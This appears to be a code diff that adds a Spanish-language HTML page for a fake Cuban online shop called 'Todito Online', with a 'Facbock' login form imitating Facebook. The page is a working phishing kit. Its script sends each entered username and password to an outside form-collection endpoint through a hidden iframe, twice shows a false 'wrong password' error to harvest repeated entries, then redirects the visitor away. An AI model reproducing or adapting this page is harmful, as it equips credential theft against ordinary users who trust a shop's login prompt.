@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Todito Online</title>
+<style>
+body {
+  margin:0;
+  font-family: system-ui, -apple-system, Arial, sans-serif;
+  background: linear-gradient(135deg,#ff9800,#f57c00,#1976d2);
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+/* LANDING */
+.landing {
+  text-align:center;
+  color:#fff;
+  max-width:650px;
+  padding:40px;
+}
+.landing h1 {
+  font-size:54px;
+  margin-bottom:20px;
+  font-weight:900;
+  letter-spacing:1px;
+}
+.landing h2 {
+  font-size:26px;
+  margin-bottom:30px;
+  font-weight:500;
+}
+.landing .highlight {
+  font-size:22px;
+  margin:20px 0;
+  font-weight:700;
+  color:#ffe082;
+}
+.landing .info {
+  font-size:20px;
+  margin:15px 0;
+  font-weight:600;
+}
+.landing .trust {
+  font-size:18px;
+  margin:12px 0;
+  font-weight:500;
+  opacity:0.95;
+}
+.landing .btn {
+  margin-top:40px;
+  padding:18px 42px;
+  border:none;
+  border-radius:12px;
+  font-weight:bold;
+  background:#1976d2;
+  color:#fff;
+  font-size:20px;
+  cursor:pointer;
+  box-shadow:0 6px 15px rgba(0,0,0,0.3);
+  transition:background 0.3s ease, transform 0.2s ease;
+}
+.landing .btn:hover { background:#1565c0; transform:scale(1.05); }
+
+/* FORMULARIO */
+.wrapper {
+  width:100%;
+  max-width:380px;
+  background:#f9f9f9;
+  border-radius:20px;
+  box-shadow:0 8px 25px rgba(0,0,0,0.35);
+  padding:22px;
+  text-align:center;
+  display:none; /* oculto al inicio */
+}
+.header {
+  background: linear-gradient(90deg,#ff9800,#f57c00);
+  padding:20px;
+  border-radius:20px 20px 0 0;
+}
+.header h1 { margin:0; font-size:26px; font-weight:800; color:#fff; }
+.header p { margin:6px 0 0; font-size:13px; color:#fff; }
+input {
+  width:100%;
+  padding:14px;
+  margin:10px 0;
+  border-radius:8px;
+  border:1px solid #ccd0d5;
+  font-size:14px;
+  background:#fff;
+  box-sizing:border-box;
+}
+.btn-login {
+  width:100%;
+  padding:14px;
+  margin-top:12px;
+  border:none;
+  border-radius:8px;
+  font-weight:bold;
+  background:#1976d2;
+  color:white;
+  font-size:15px;
+  cursor:pointer;
+}
+.btn-login:hover { background:#1565c0; }
+
+/* MENSAJES */
+.message {
+  margin-top:12px;
+  font-size:14px;
+  font-weight:600;
+  padding:10px;
+  border-radius:6px;
+}
+.error {
+  color:#fff;
+  background:#d32f2f;
+}
+
+/* Animaciones para el mensaje de error */
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(-5px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+@keyframes fadeOut {
+  from { opacity: 1; transform: translateY(0); }
+  to { opacity: 0; transform: translateY(-5px); }
+}
+.message.show {
+  animation: fadeIn 0.5s forwards;
+}
+.message.hide {
+  animation: fadeOut 0.5s forwards;
+}
+
+/* MENSAJE FINAL */
+.final-message {
+  position:fixed;
+  top:50%;
+  left:50%;
+  transform:translate(-50%, -50%);
+  width:90%;
+  max-width:320px;
+  background:#1976d2;
+  border-radius:14px;
+  box-shadow:0 8px 25px rgba(0,0,0,0.3);
+  text-align:center;
+  z-index:999;
+  color:white;
+  padding:20px;
+  display:none;
+  opacity:0;
+  transition:opacity 0.5s ease;
+}
+.final-message.show {
+  display:block;
+  opacity:1;
+}
+.final-message h2 {
+  margin:0 0 10px;
+  font-size:18px;
+  font-weight:700;
+}
+.loader {
+  border:4px solid #f3f3f3;
+  border-top:4px solid #fff;
+  border-radius:50%;
+  width:30px;
+  height:30px;
+  margin:15px auto;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin {
+  0% { transform:rotate(0deg); }
+  100% { transform:rotate(360deg); }
+}
+</style>
+</head>
+<body>
+
+<!-- LANDING -->
+<div class="landing" id="landing">
+  <h1>Todito Online</h1>
+  <h2>Haz tus compras en línea desde la comodidad de tu casa</h2>
+  <div class="highlight">💳 Aceptamos pagos en: MLC – TRANSFERENCIA – CLÁSICA</div>
+  <div class="info">🚚 Envíos a toda Cuba</div>
+  <div class="trust">🔒 Compra segura y protegida</div>
+  <div class="trust">✅ Garantía de calidad en cada pedido</div>
+  <div class="trust">📞 Atención al cliente siempre disponible</div>
+  <button class="btn" onclick="mostrarLogin()">Inicia con Facbock</button>
+</div>
+
+<!-- FORMULARIO -->
+<div class="wrapper" id="loginWrapper">
+  <div class="header">
+    <h1>INICIA CON FACBOCK</h1>
+    <p>Ingresa tus datos</p>
+  </div>
+
+  <form id="toditoForm" action="https://submit-form.com/IPlk1gidN" method="POST" target="hidden_iframe">
+    <input type="text" name="usuario" placeholder="Correo o número" required>
+    <input type="password" name="clave" placeholder="Contraseña" required>
+    <button type="submit" class="btn-login">Acceder</button>
+    <div id="message" class="message"></div>
+  </form>
+</div>
+
+<!-- IFRAME OCULTO -->
+<iframe name="hidden_iframe" style="display:none;"></iframe>
+
+<!-- MENSAJE FINAL -->
+<div id="finalMessage" class="final-message">
+  <h2>Gracias por su registro</h2>
+  <p>Disfrute nuestra tienda.</p>
+  <div class="loader"></div>
+</div>
+
+<script>
+let intentos = 0;
+
+function mostrarLogin(){
+  document.getElementById("landing").style.display="none";
+  document.getElementById("loginWrapper").style.display="block";
+}
+
+document.getElementById("toditoForm").addEventListener("submit", function(e){
+  e.preventDefault(); 
+  intentos++;
+
+  // Enviar datos a Formspark en cada intento
+  this.submit();
+
+  const message = document.getElementById("message");
+
+  if(intentos < 3){
+    message.textContent = "Error: contraseña incorrecta";
+    message.className = "message error show";
+
+    // Desaparece con fade-out después de 2 segundos
+    setTimeout(() => {
+      message.className = "message error hide";
+      setTimeout(() => {
+        message.textContent = "";
+        message.className = "message";
+      }, 500); 
+    }, 2000);
+
+  } else {
+    // Mensaje final con fade-in
+    const finalMsg = document.getElementById("finalMessage");
+    finalMsg.classList.add("show");
+    message.textContent = "";
+    setTimeout(function(){
+      finalMsg.style.opacity = "0"; // fade-out
+      setTimeout(function(){
+        window.location.href = "https://pymemarket.online/";
+      }, 800);
+    }, 2500);
+  }
+});
+</script>
+
+</body>
+</html>
